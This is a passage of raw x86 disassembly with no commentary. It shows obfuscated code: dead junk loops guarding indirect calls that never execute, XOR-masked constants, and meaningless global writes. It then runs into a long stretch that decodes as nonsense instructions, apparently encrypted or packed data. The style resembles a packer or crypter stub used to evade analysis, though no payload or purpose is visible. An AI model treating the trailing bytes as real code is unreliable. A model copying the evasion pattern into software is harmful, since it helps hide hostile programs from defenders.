  41c4c7:	add    ecx,DWORD PTR ds:0x429004
  41c4cd:	dec    ecx
  41c4ce:	mov    DWORD PTR ds:0x429004,ecx
  41c4d4:	jmp    0x41c481
  41c4d9:	mov    ecx,DWORD PTR ds:0x421a96
  41c4df:	mov    ecx,DWORD PTR [ecx]
  41c4e1:	and    DWORD PTR ds:0x428024,ecx
  41c4e7:	movzx  eax,ax
  41c4ea:	xor    DWORD PTR ds:0x42a004,0x42801c
  41c4f4:	mov    DWORD PTR [ebp-0x18],eax
  41c4f7:	and    DWORD PTR ds:0x42801c,0x7f28
  41c501:	mov    BYTE PTR [ebp-0x1],0x61
  41c505:	xor    ecx,0x4092
  41c50b:	lea    eax,[ebp-0x1]
  41c50e:	sub    DWORD PTR ds:0x429008,0x31e1
  41c518:	mov    DWORD PTR [ebp-0x10],eax
  41c51b:	add    ecx,DWORD PTR ds:0x428010
  41c521:	mov    al,BYTE PTR [ebp-0x1]
  41c524:	and    ecx,0x7ba8
  41c52a:	mov    ecx,DWORD PTR [ebp-0x10]
  41c52d:	xor    al,0x6f
  41c52f:	and    DWORD PTR ds:0x428008,0x42b018
  41c539:	sub    al,0xd
  41c53b:	adc    DWORD PTR ds:0x428018,0x42b008
  41c545:	mov    BYTE PTR [ecx],al
  41c547:	add    DWORD PTR ds:0x42a01c,ecx
  41c54d:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  41c554:	mov    DWORD PTR ds:0x42a010,0x1c
  41c55e:	cmp    DWORD PTR ds:0x42a010,0x0
  41c565:	je     0x41c5a5
  41c56b:	cmp    DWORD PTR ds:0x42a010,0x2c
  41c572:	jne    0x41c58b
  41c578:	push   0x5aa3
  41c57d:	push   0x697d
  41c582:	push   DWORD PTR [ebp-0x28]
  41c585:	call   DWORD PTR ds:0x424028
  41c58b:	xor    ecx,ecx
  41c58d:	add    ecx,DWORD PTR ds:0x42a010
  41c593:	dec    ecx
  41c594:	mov    DWORD PTR ds:0x42a010,ecx
  41c59a:	jmp    0x41c55e
  41c59f:	sbb    DWORD PTR ds:0x42a000,ebx
  41c5a5:	push   ebx
  41c5a6:	sbb    eax,ecx
  41c5a8:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41c5af:	and    DWORD PTR ds:0x428020,0x0
  41c5b9:	jmp    0x41c5cb
  41c5be:	mov    ecx,DWORD PTR ds:0x428020
  41c5c4:	inc    ecx
  41c5c5:	mov    DWORD PTR ds:0x428020,ecx
  41c5cb:	cmp    DWORD PTR ds:0x428020,0x19
  41c5d2:	jae    0x41c5fa
  41c5d8:	cmp    DWORD PTR ds:0x428020,0x28
  41c5df:	jne    0x41c5f5
  41c5e5:	push   0x423948
  41c5ea:	push   0x4238ad
  41c5ef:	call   DWORD PTR ds:0x424030
  41c5f5:	jmp    0x41c5be
  41c5fa:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5fd:	push   esi
  41c5fe:	movzx  esi,BYTE PTR ds:0x42a014
  41c605:	sub    esi,DWORD PTR ds:0x429018
  41c60b:	mov    DWORD PTR ds:0x42a014,esi
  41c611:	mov    eax,0x7510893
  41c616:	mov    esi,DWORD PTR ds:0x42a01c
  41c61c:	adc    esi,DWORD PTR ds:0x42a00c
  41c622:	mov    DWORD PTR ds:0x42a01c,esi
  41c628:	xor    ecx,eax
  41c62a:	neg    esi
  41c62c:	mov    esi,0x3272db
  41c631:	push   edi
  41c632:	add    ecx,esi
  41c634:	mov    DWORD PTR ds:0x42b018,0x6b60
  41c63e:	jmp    0x41c662
  41c643:	mov    DWORD PTR ds:0x42b000,0x231b
  41c64d:	mov    dl,BYTE PTR [ebp-0x1]
  41c650:	mov    DWORD PTR ds:0x42a018,0x496a
  41c65a:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  41c661:	inc    ecx
  41c662:	mov    DWORD PTR ds:0x429014,0x116e
  41c66c:	cmp    ecx,0x40
  41c66f:	mov    DWORD PTR ds:0x42a014,0x7e65
  41c679:	jb     0x41c643
  41c67f:	and    edx,DWORD PTR ds:0x428008
  41c685:	mov    edx,DWORD PTR [ebp-0x14]
  41c688:	sbb    DWORD PTR ds:0x429004,0x429010
  41c692:	xor    edx,eax
  41c694:	add    edx,esi
  41c696:	jmp    0x41c829
  41c69b:	mov    DWORD PTR ds:0x429018,0x1f
  41c6a5:	cmp    DWORD PTR ds:0x429018,0x0
  41c6ac:	je     0x41c713
  41c6b2:	cmp    DWORD PTR ds:0x429018,0xf
  41c6b9:	jne    0x41c6dd
  41c6bf:	push   DWORD PTR [ebp-0x20]
  41c6c2:	push   DWORD PTR [ebp-0x10]
  41c6c5:	push   0x45b6
  41c6ca:	push   DWORD PTR [ebp-0x1c]
  41c6cd:	push   0x5bd1
  41c6d2:	push   0x42c008
  41c6d7:	call   DWORD PTR ds:0x424038
  41c6dd:	cmp    DWORD PTR ds:0x429018,0x10
  41c6e4:	jne    0x41c6f7
  41c6ea:	mov    edi,DWORD PTR ds:0x429018
  41c6f0:	dec    edi
  41c6f1:	mov    DWORD PTR ds:0x429018,edi
  41c6f7:	mov    edi,DWORD PTR ds:0x429018
  41c6fd:	dec    edi
  41c6fe:	mov    DWORD PTR ds:0x429018,edi
  41c704:	jmp    0x41c6a5
  41c709:	or     DWORD PTR ds:0x42a000,0x7430
  41c713:	mov    edi,DWORD PTR [ebp+0x8]
  41c716:	mov    DWORD PTR ds:0x428028,0x1e
  41c720:	cmp    DWORD PTR ds:0x428028,0x0
  41c727:	je     0x41c766
  41c72d:	cmp    DWORD PTR ds:0x428028,0x2e
  41c734:	jne    0x41c74a
  41c73a:	push   0x42a008
  41c73f:	push   0x6949
  41c744:	call   DWORD PTR ds:0x42403c
  41c74a:	mov    ecx,DWORD PTR ds:0x428028
  41c750:	dec    ecx
  41c751:	mov    DWORD PTR ds:0x428028,ecx
  41c757:	jmp    0x41c720
  41c75c:	adc    DWORD PTR ds:0x42b00c,0x42c008
  41c766:	mov    ecx,0x8a85
  41c76b:	add    DWORD PTR ds:0x42b000,0x429018
  41c775:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41c77a:	and    DWORD PTR ds:0x428018,0x0
  41c784:	jmp    0x41c796
  41c789:	mov    edi,DWORD PTR ds:0x428018
  41c78f:	inc    edi
  41c790:	mov    DWORD PTR ds:0x428018,edi
  41c796:	cmp    DWORD PTR ds:0x428018,0x1a
  41c79d:	jae    0x41c7d2
  41c7a3:	cmp    DWORD PTR ds:0x428018,0x25
  41c7aa:	jne    0x41c7c0
  41c7b0:	push   0x55c3
  41c7b5:	push   0x423923
  41c7ba:	call   DWORD PTR ds:0x424040
  41c7c0:	jmp    0x41c789
  41c7c5:	movzx  edi,WORD PTR ds:0x42901c
  41c7cc:	sub    DWORD PTR ds:0x42b00c,edi
  41c7d2:	mov    edi,0x3b4b
  41c7d7:	add    cx,di
  41c7da:	movzx  ecx,cx
  41c7dd:	mov    DWORD PTR [ebp-0x10],ecx
  41c7e0:	mov    ecx,DWORD PTR [ebp+0x8]
  41c7e3:	sub    DWORD PTR ds:0x428004,0x4ea
  41c7ed:	movzx  ecx,WORD PTR [ecx+edx*4]
  41c7f1:	add    DWORD PTR ds:0x42b01c,0x42b000
  41c7fb:	xor    ecx,0x8a85
  41c801:	sub    DWORD PTR ds:0x428014,0x428000
  41c80b:	add    ecx,edi
  41c80d:	mov    edi,DWORD PTR [ebp-0x10]
  41c810:	mov    DWORD PTR ds:0x42b004,0x1d90
  41c81a:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  41c821:	movzx  ecx,BYTE PTR ds:0x428010
  41c828:	inc    edx
  41c829:	mov    ecx,DWORD PTR [ebp-0x18]
  41c82c:	cmp    edx,ecx
  41c82e:	mov    DWORD PTR ds:0x429018,0x3a83
  41c838:	jne    0x41c69b
  41c83e:	and    edx,edx
  41c840:	mov    ecx,DWORD PTR [ebp-0x14]
  41c843:	mov    edx,DWORD PTR [ebp+0x10]
  41c846:	add    DWORD PTR ds:0x42c008,0x32e9
  41c850:	xor    ecx,eax
  41c852:	add    ecx,esi
  41c854:	sub    DWORD PTR ds:0x428020,0x428004
  41c85e:	mov    DWORD PTR [edx],ecx
  41c860:	sub    DWORD PTR ds:0x428028,0x1657
  41c86a:	mov    ecx,DWORD PTR [ebp-0x14]
  41c86d:	xor    ecx,eax
  41c86f:	sub    DWORD PTR ds:0x42b01c,0x42c010
  41c879:	add    ecx,esi
  41c87b:	mov    DWORD PTR [ebp-0x20],ecx
  41c87e:	mov    ecx,DWORD PTR ds:0x42a00c
  41c884:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  41c88b:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  41c892:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  41c899:	movzx  ecx,WORD PTR ds:0x42a004
  41c8a0:	mov    ecx,DWORD PTR [ebp-0xc]
  41c8a3:	mov    DWORD PTR [ebp+0x8],ecx
  41c8a6:	mov    DWORD PTR ds:0x42b008,0x111a
  41c8b0:	jmp    0x41cb0e
  41c8b5:	xor    edx,0x5725
  41c8bb:	mov    ecx,DWORD PTR [ebp+0x8]
  41c8be:	mov    edx,DWORD PTR ds:0x42b000
  41c8c4:	add    DWORD PTR ds:0x42b01c,edx
  41c8ca:	mov    edx,DWORD PTR [ebp-0x8]
  41c8cd:	xor    ecx,eax
  41c8cf:	xor    edx,eax
  41c8d1:	sub    ecx,edx
  41c8d3:	sub    ecx,esi
  41c8d5:	and    DWORD PTR ds:0x428000,0x0
  41c8df:	mov    edx,DWORD PTR ds:0x428000
  41c8e5:	inc    edx
  41c8e6:	mov    DWORD PTR ds:0x428000,edx
  41c8ec:	cmp    DWORD PTR ds:0x428000,0xb
  41c8f3:	jne    0x41c904
  41c8f9:	push   0x42390e
  41c8fe:	call   DWORD PTR ds:0x424044
  41c904:	cmp    DWORD PTR ds:0x428000,0xa
  41c90b:	jne    0x41c91e
  41c911:	mov    edx,DWORD PTR ds:0x428000
  41c917:	inc    edx
  41c918:	mov    DWORD PTR ds:0x428000,edx
  41c91e:	cmp    DWORD PTR ds:0x428000,0x15
  41c925:	jb     0x41c8df
  41c92b:	and    DWORD PTR ds:0x429018,0x0
  41c935:	jmp    0x41c949
  41c93a:	xor    edx,edx
  41c93c:	xor    edx,DWORD PTR ds:0x429018
  41c942:	inc    edx
  41c943:	mov    DWORD PTR ds:0x429018,edx
  41c949:	cmp    DWORD PTR ds:0x429018,0x10
  41c950:	jae    0x41c9c2
  41c956:	cmp    DWORD PTR ds:0x429018,0x17
  41c95d:	jne    0x41c976
  41c963:	push   DWORD PTR [ebp-0x24]
  41c966:	push   0x42801c
  41c96b:	push   0x423a44
  41c970:	call   DWORD PTR ds:0x424048
  41c976:	jmp    0x41c93a
  41c97b:	and    DWORD PTR ds:0x42c004,0x0
  41c985:	mov    edx,DWORD PTR ds:0x42c004
  41c98b:	inc    edx
  41c98c:	mov    DWORD PTR ds:0x42c004,edx
  41c992:	cmp    DWORD PTR ds:0x42c004,0x1e
  41c999:	jne    0x41c9af
  41c99f:	push   0x42b018
  41c9a4:	push   0x6f2d
  41c9a9:	call   DWORD PTR ds:0x424014
  41c9af:	cmp    DWORD PTR ds:0x42c004,0x16
  41c9b6:	jb     0x41c985
  41c9bc:	and    DWORD PTR ds:0x42c014,ecx
  41c9c2:	xor    ecx,eax
  41c9c4:	adc    DWORD PTR ds:0x42c01c,0x41e5
  41c9ce:	mov    DWORD PTR [ebp+0x8],ecx
  41c9d1:	and    DWORD PTR ds:0x429010,0x0
  41c9db:	xor    edx,edx
  41c9dd:	xor    edx,DWORD PTR ds:0x429010
  41c9e3:	inc    edx
  41c9e4:	mov    DWORD PTR ds:0x429010,edx
  41c9ea:	cmp    DWORD PTR ds:0x429010,0x4
  41c9f1:	jne    0x41ca1f
  41c9f7:	push   DWORD PTR [ebp-0x14]
  41c9fa:	push   0x42b010
  41c9ff:	push   0x6800
  41ca04:	push   0x42a000
  41ca09:	push   DWORD PTR [ebp-0x10]
  41ca0c:	push   0x5c37
  41ca11:	push   0x63a5
  41ca16:	push   DWORD PTR [ebp-0x1c]
  41ca19:	call   DWORD PTR ds:0x424018
  41ca1f:	cmp    DWORD PTR ds:0x429010,0x3
  41ca26:	jne    0x41ca3b
  41ca2c:	xor    edx,edx
  41ca2e:	add    edx,DWORD PTR ds:0x429010
  41ca34:	inc    edx
  41ca35:	mov    DWORD PTR ds:0x429010,edx
  41ca3b:	cmp    DWORD PTR ds:0x429010,0x1e
  41ca42:	jb     0x41c9db
  41ca48:	and    edx,0x1801
  41ca4e:	mov    ecx,DWORD PTR [ebp+0x8]
  41ca51:	and    DWORD PTR ds:0x42c018,0x0
  41ca5b:	jmp    0x41ca6f
  41ca60:	xor    edx,edx
  41ca62:	add    edx,DWORD PTR ds:0x42c018
  41ca68:	inc    edx
  41ca69:	mov    DWORD PTR ds:0x42c018,edx
  41ca6f:	cmp    DWORD PTR ds:0x42c018,0x1f
  41ca76:	jae    0x41cab1
  41ca7c:	cmp    DWORD PTR ds:0x42c018,0x12
  41ca83:	jne    0x41ca92
  41ca89:	push   DWORD PTR [ebp-0x28]
  41ca8c:	call   DWORD PTR ds:0x42401c
  41ca92:	cmp    DWORD PTR ds:0x42c018,0x11
  41ca99:	jne    0x41caac
  41ca9f:	mov    edx,DWORD PTR ds:0x42c018
  41caa5:	inc    edx
  41caa6:	mov    DWORD PTR ds:0x42c018,edx
  41caac:	jmp    0x41ca60
  41cab1:	mov    edx,DWORD PTR [ebp-0x64]
  41cab4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cabb:	mov    DWORD PTR [ebp-0x64],ecx
  41cabe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cac1:	mov    edx,DWORD PTR [ebp-0x60]
  41cac4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cacb:	mov    DWORD PTR [ebp-0x60],ecx
  41cace:	mov    ecx,DWORD PTR [ebp+0x8]
  41cad1:	mov    edx,DWORD PTR [ebp-0x5c]
  41cad4:	lea    ecx,[edx+ecx*1+0x5708f4]
  41cadb:	mov    DWORD PTR [ebp-0x5c],ecx
  41cade:	mov    ecx,DWORD PTR [ebp+0x8]
  41cae1:	mov    edx,DWORD PTR [ebp-0x58]
  41cae4:	lea    ecx,[edx+ecx*1+0x5708fb]
  41caeb:	mov    DWORD PTR [ebp-0x58],ecx
  41caee:	mov    ecx,DWORD PTR [ebp+0x8]
  41caf1:	mov    edx,DWORD PTR [ebp-0x54]
  41caf4:	lea    ecx,[edx+ecx*1+0x5708fa]
  41cafb:	mov    DWORD PTR [ebp-0x54],ecx
  41cafe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb01:	mov    edx,DWORD PTR [ebp-0x50]
  41cb04:	lea    ecx,[edx+ecx*1+0x5708f9]
  41cb0b:	mov    DWORD PTR [ebp-0x50],ecx
  41cb0e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb11:	xor    ecx,eax
  41cb13:	add    ecx,esi
  41cb15:	jne    0x41c8b5
  41cb1b:	jmp    0x41f062
  41cb20:	mov    ecx,DWORD PTR [ebp-0x1c]
  41cb23:	mov    edx,DWORD PTR [ebp-0x8]
  41cb26:	xor    ecx,eax
  41cb28:	xor    edx,eax
  41cb2a:	sub    ecx,edx
  41cb2c:	sub    ecx,esi
  41cb2e:	xor    ecx,eax
  41cb30:	mov    DWORD PTR [ebp-0x1c],ecx
  41cb33:	mov    ecx,DWORD PTR [ebp-0xc]
  41cb36:	mov    DWORD PTR [ebp+0x8],ecx
  41cb39:	jmp    0x41cb6b
  41cb3e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb41:	mov    edx,DWORD PTR [ebp-0x8]
  41cb44:	xor    ecx,eax
  41cb46:	xor    edx,eax
  41cb48:	sub    ecx,edx
  41cb4a:	sub    ecx,esi
  41cb4c:	xor    ecx,eax
  41cb4e:	mov    DWORD PTR [ebp+0x8],ecx
  41cb51:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb54:	mov    edx,DWORD PTR [ebp+0x8]
  41cb57:	imul   edx,edx,0x5708f5
  41cb5d:	xor    ecx,eax
  41cb5f:	add    ecx,esi
  41cb61:	lea    ecx,[ebp+ecx*4-0x64]
  41cb65:	mov    edi,DWORD PTR [ecx]
  41cb67:	add    edx,edi
  41cb69:	mov    DWORD PTR [ecx],edx
  41cb6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb6e:	xor    ecx,eax
  41cb70:	add    ecx,esi
  41cb72:	jne    0x41cb3e
  41cb78:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb7b:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb82:	mov    dl,BYTE PTR [ebp-0x1]
  41cb85:	cmp    cl,dl
  41cb87:	je     0x41cc60
  41cb8d:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb90:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb97:	mov    edx,DWORD PTR [ebp+0xc]
  41cb9a:	cmp    cl,BYTE PTR [edx]
  41cb9c:	jne    0x41f074
  41cba2:	mov    ecx,DWORD PTR [ebp-0x14]
  41cba5:	mov    edx,DWORD PTR [ebp+0xc]
  41cba8:	movsx  edx,BYTE PTR [edx]
  41cbab:	xor    ecx,eax
  41cbad:	add    ecx,esi
  41cbaf:	cmp    edx,ecx
  41cbb1:	mov    ecx,DWORD PTR [ebp-0xc]
  41cbb4:	mov    DWORD PTR [ebp+0x8],ecx
  41cbb7:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbba:	je     0x421451
  41cbc0:	jmp    0x41cbf5
  41cbc5:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbc8:	mov    edx,DWORD PTR [ebp-0x8]
  41cbcb:	xor    ecx,eax
  41cbcd:	xor    edx,eax
  41cbcf:	sub    ecx,edx
  41cbd1:	sub    ecx,esi
  41cbd3:	xor    ecx,eax
  41cbd5:	mov    DWORD PTR [ebp+0x8],ecx
  41cbd8:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbdb:	mov    edx,DWORD PTR [ebp+0x8]
  41cbde:	xor    ecx,eax
  41cbe0:	imul   edx,edx,0x5708f5
  41cbe6:	add    ecx,esi
  41cbe8:	lea    ecx,[ebp+ecx*4-0x64]
  41cbec:	mov    edi,DWORD PTR [ecx]
  41cbee:	add    edx,edi
  41cbf0:	mov    DWORD PTR [ecx],edx
  41cbf2:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbf5:	xor    ecx,eax
  41cbf7:	add    ecx,esi
  41cbf9:	jne    0x41cbc5
  41cbff:	mov    ecx,DWORD PTR [ebp-0x14]
  41cc02:	mov    edx,DWORD PTR [ebp+0x8]
  41cc05:	xor    ecx,eax
  41cc07:	xor    edx,eax
  41cc09:	add    ecx,esi
  41cc0b:	add    edx,esi
  41cc0d:	cmp    ecx,edx
  41cc0f:	jae    0x41f008
  41cc15:	lea    edx,[ecx-0x3272db]
  41cc1b:	mov    DWORD PTR [ebp-0x18],edx
  41cc1e:	mov    edi,DWORD PTR [ebp-0x18]
  41cc21:	mov    DWORD PTR [ebp-0x24],0x705fd08
  41cc28:	lea    edx,[ebp-0x24]
  41cc2b:	mov    DWORD PTR [ebp-0x10],edx
  41cc2e:	mov    edx,DWORD PTR [ebp-0x10]
  41cc31:	add    DWORD PTR [edx],0x705fa08
  41cc37:	mov    ebx,DWORD PTR [ebp-0x10]
  41cc3a:	xor    edi,eax
  41cc3c:	add    edi,DWORD PTR [ebx]
  41cc3e:	lea    edx,[ebp+ecx*4-0x64]
  41cc42:	mov    ebx,DWORD PTR [edx]
  41cc44:	xor    edi,ebx
  41cc46:	mov    DWORD PTR [edx],edi
  41cc48:	mov    edx,DWORD PTR [ebp+0x8]
  41cc4b:	xor    edx,eax
  41cc4d:	inc    ecx
  41cc4e:	inc    DWORD PTR [ebp-0x18]
  41cc51:	add    edx,esi
  41cc53:	cmp    ecx,edx
  41cc55:	jb     0x41cc1e
  41cc5b:	jmp    0x41f008
  41cc60:	mov    ecx,DWORD PTR [ebp-0xc]
  41cc63:	mov    DWORD PTR [ebp+0x8],ecx
  41cc66:	jmp    0x41cc98
  41cc6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc6e:	mov    edx,DWORD PTR [ebp-0x8]
  41cc71:	xor    ecx,eax
  41cc73:	xor    edx,eax
  41cc75:	sub    ecx,edx
  41cc77:	sub    ecx,esi
  41cc79:	xor    ecx,eax
  41cc7b:	mov    DWORD PTR [ebp+0x8],ecx
  41cc7e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc81:	mov    edx,DWORD PTR [ebp+0x8]
  41cc84:	imul   edx,edx,0x5708f5
  41cc8a:	xor    ecx,eax
  41cc8c:	add    ecx,esi
  41cc8e:	lea    ecx,[ebp+ecx*4-0x64]
  41cc92:	mov    edi,DWORD PTR [ecx]
  41cc94:	add    edx,edi
  41cc96:	mov    DWORD PTR [ecx],edx
  41cc98:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc9b:	jmp    0x41effe
  41cca0:	mov    dl,0xcf
  41cca2:	enter  0x872f,0x27
  41cca6:	imul   ebp,DWORD PTR [edi+0x65],0x64d7ebdc
  41ccad:	ret    
  41ccae:	int3   
  41ccaf:	mov    eax,0x6261fc97
  41ccb4:	cmp    al,0x5f
  41ccb6:	bound  esp,QWORD PTR [edx+0x25]
  41ccb9:	daa    
  41ccba:	aas    
  41ccbb:	test   al,0xf3
  41ccbd:	jo     0x41cd30
  41ccbf:	sti    
  41ccc0:	mov    eax,0x9d8ff7cb
  41ccc5:	xchg   ecx,eax
  41ccc6:	add    al,0xbe
  41ccc8:	add    BYTE PTR [edi+ecx*2-0x4648cfa5],al
  41cccf:	dec    eax
  41ccd0:	mov    al,ds:0x4a1c7387
  41ccd5:	lea    ebp,[esi]
  41ccd7:	ret    
  41ccd8:	sub    cl,dl
  41ccda:	rcl    ch,cl
  41ccdc:	and    BYTE PTR ds:0xa9b94f78,bl
  41cce2:	(bad)  
  41cce3:	or     al,0x6d
  41cce5:	mov    ah,0x89
  41cce7:	mov    BYTE PTR [ecx],bh
  41cce9:	add    edx,DWORD PTR [ebx]
  41cceb:	mov    esp,0xb546b70a
  41ccf0:	es (bad) 
  41ccf2:	mov    dl,0x75
  41ccf4:	mov    bl,0xb8
  41ccf6:	test   DWORD PTR [ebx+eax*1],eax
  41ccf9:	jl     0x41cd06
  41ccfb:	in     eax,0x97
  41ccfd:	mov    al,0x62
  41ccff:	dec    esp
  41cd00:	clc    
  41cd01:	dec    eax
  41cd02:	pusha  
  41cd03:	lods   al,BYTE PTR ds:[esi]
  41cd04:	sub    edi,DWORD PTR [ebx]
  41cd06:	cmc    
  41cd07:	push   edx
  41cd08:	out    dx,eax
  41cd09:	xchg   edx,eax
  41cd0a:	dec    ebx
  41cd0b:	mov    dh,BYTE PTR [ecx-0x1b]
  41cd0e:	les    esi,FWORD PTR [esp+edi*4]
  41cd11:	xchg   ebx,eax
  41cd12:	adc    al,al
  41cd14:	stc    
  41cd15:	sub    BYTE PTR [eax+eax*8+0x1e],bl
  41cd19:	add    eax,0x64c63ae1
  41cd1e:	neg    BYTE PTR [eax+0x45]
  41cd21:	inc    esp
  41cd22:	jle    0x41cd9b
  41cd24:	and    DWORD PTR [ecx],0x436ec0b5
  41cd2a:	push   edx
  41cd2b:	dec    edx
  41cd2c:	xor    eax,0xe3e95934
  41cd31:	inc    esi
  41cd32:	js     0x41cd8f
  41cd34:	(bad)  
  41cd36:	(bad)  
  41cd37:	mov    ebx,0xa04d60ab
  41cd3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd3d:	aas    
  41cd3e:	mov    ecx,0x7a94721d
  41cd43:	pop    ebx
  41cd44:	aas    
  41cd45:	push   eax
  41cd46:	xor    eax,0xea81dcc8
  41cd4b:	adc    DWORD PTR [ecx-0x13],esi
  41cd4e:	mov    al,0x7e
  41cd50:	mov    ecx,DWORD PTR [eax]
  41cd52:	sbb    eax,0xbb5a6b0f
  41cd57:	lock mov esp,ecx
  41cd5a:	and    al,0x79
  41cd5c:	jmp    DWORD PTR [edi]
  41cd5e:	sbb    DWORD PTR [esp+edx*4],0x4b
  41cd62:	outs   dx,BYTE PTR ds:[esi]
  41cd63:	test   BYTE PTR [edx+0x5f],cl
  41cd66:	xchg   esi,eax
  41cd67:	ins    BYTE PTR es:[edi],dx
  41cd68:	adc    al,0xf2
  41cd6a:	imul   DWORD PTR [edx+0x5da2d29b]
  41cd70:	cwde   
  41cd71:	xchg   esp,eax
  41cd72:	adc    ch,ah
  41cd74:	mov    dh,0x3c
  41cd76:	add    eax,0x762d65a7
  41cd7b:	call   0xcde94340
  41cd80:	xchg   ebx,eax
  41cd81:	xchg   ebx,eax
  41cd82:	push   0x72
  41cd84:	jbe    0x41cd14
  41cd86:	xor    esp,DWORD PTR [edi-0x7b]
  41cd89:	ins    DWORD PTR es:[edi],dx
  41cd8a:	xor    ch,BYTE PTR [esi]
  41cd8c:	or     al,0xc6
  41cd8e:	lods   eax,DWORD PTR ds:[esi]
  41cd8f:	mov    BYTE PTR [esi-0x7],dl
  41cd92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd93:	or     cl,BYTE PTR [edi-0x19]
  41cd96:	retf   0x9b5d
  41cd99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd9a:	aas    
  41cd9b:	xchg   DWORD PTR [ebp-0x24fda0c7],edi
  41cda1:	loop   0x41cdcb
  41cda3:	mov    ebp,0x94eacc0e
  41cda8:	ret    
  41cda9:	outs   dx,DWORD PTR ds:[esi]
  41cdaa:	mov    al,0xac
  41cdac:	in     eax,0xa6
  41cdae:	in     eax,0xf3
  41cdb0:	adc    dl,BYTE PTR [esi+0x62f00b50]
  41cdb6:	inc    esi
  41cdb7:	stos   DWORD PTR es:[edi],eax
  41cdb8:	pop    esp
  41cdb9:	aam    0x88
  41cdbb:	(bad)  
  41cdbc:	rol    BYTE PTR [edi],0x5b
  41cdbf:	and    al,0xb9
  41cdc1:	pop    es
  41cdc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdc3:	sbb    al,0x6d
  41cdc5:	mov    bh,0xd0
  41cdc7:	xchg   DWORD PTR [esi],ebx
  41cdc9:	push   cs
  41cdca:	cmp    DWORD PTR [ecx],eax
  41cdcc:	data16 xchg BYTE PTR [edx+0x39],ah
  41cdd0:	test   al,0xba
  41cdd2:	and    eax,ebp
  41cdd4:	(bad)  
  41cdd5:	cmp    BYTE PTR [edx+0x0],bl
  41cdd8:	pop    esp
  41cdd9:	cld    
  41cdda:	jo     0x41ce15
  41cddc:	mov    al,0xb6
  41cdde:	mov    ch,0xa5
  41cde0:	add    al,0xb5
  41cde2:	sbb    DWORD PTR [edi+0x35897ee],ebx
  41cde8:	(bad)  
  41cde9:	pushf  
  41cdea:	das    
  41cdeb:	loope  0x41cdc9
  41cded:	ss retf 0x7867
  41cdf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdf2:	jno    0x41cdeb
  41cdf4:	mov    esp,0x969482cb
  41cdf9:	mov    ebp,DWORD PTR [ecx+0x76]
  41cdfc:	inc    esp
  41cdfd:	pop    ecx
  41cdfe:	mov    bl,0xb3
  41ce00:	hlt    
  41ce01:	(bad)  
  41ce02:	lock cmc 
  41ce04:	sbb    DWORD PTR [eax*2-0x7e51f75c],0x935c0be1
  41ce0f:	test   eax,0xa232aff6
  41ce14:	inc    ebx
  41ce15:	jb     0x41ce61
  41ce17:	mov    al,bh
  41ce19:	sti    
  41ce1a:	adc    ch,BYTE PTR [ebp-0x2c282179]
  41ce20:	inc    edi
  41ce21:	pop    esi
  41ce22:	inc    edi
  41ce23:	cmp    ebx,DWORD PTR [eax-0x20]
  41ce26:	jns    0x41ce43
  41ce28:	mov    ebp,0xa8b3125a
  41ce2d:	push   edx
  41ce2e:	xor    DWORD PTR [ebp-0x3994ec14],0x4dacc971
  41ce38:	inc    edx
  41ce39:	adc    al,0x2d
  41ce3b:	or     BYTE PTR [edx-0x40],dl
  41ce3e:	inc    edi
  41ce3f:	in     eax,dx
  41ce40:	ss test ebp,esi
  41ce43:	cmp    al,0xa6
  41ce45:	and    DWORD PTR [ebx+0x304c8987],ebx
  41ce4b:	and    al,0x8e
  41ce4d:	retf   0xac48
  41ce50:	add    BYTE PTR [edx+ecx*8-0x2d49c256],bl
  41ce57:	mov    esp,0xf90a3c0a
  41ce5c:	rcr    ecx,cl
  41ce5e:	out    0x20,eax
  41ce60:	pushf  
  41ce61:	mov    ebx,0x67dc6372
  41ce66:	push   ebp
  41ce67:	retf   
  41ce68:	pop    ecx
  41ce69:	mov    dh,0x90
  41ce6b:	repnz mov bh,dh
  41ce6e:	retf   
  41ce6f:	inc    esi
  41ce70:	jne    0x41ce34
  41ce72:	lods   al,BYTE PTR ds:[esi]
  41ce73:	jae    0x41ce47
  41ce75:	xor    ch,BYTE PTR [esi+0x27]
  41ce78:	push   esi
  41ce79:	lods   al,BYTE PTR ds:[esi]
  41ce7a:	lea    ebp,[edx]
  41ce7c:	fcmovnu st,st(6)
  41ce7e:	jb     0x41cee5
  41ce80:	pushf  
  41ce81:	adc    ebx,DWORD PTR ds:0x81b98a4c
  41ce87:	cmp    BYTE PTR [ebp+ebx*4+0x50],al
  41ce8b:	push   es
  41ce8c:	add    eax,0x4c3e7066
  41ce91:	inc    esi
  41ce92:	(bad)  
  41ce93:	shl    ebp,cl
  41ce95:	add    al,0x35
  41ce97:	pop    ebx
  41ce98:	cwde   
  41ce99:	fs pop ss
  41ce9b:	stos   DWORD PTR es:[edi],eax
  41ce9c:	in     al,dx
  41ce9d:	(bad)  
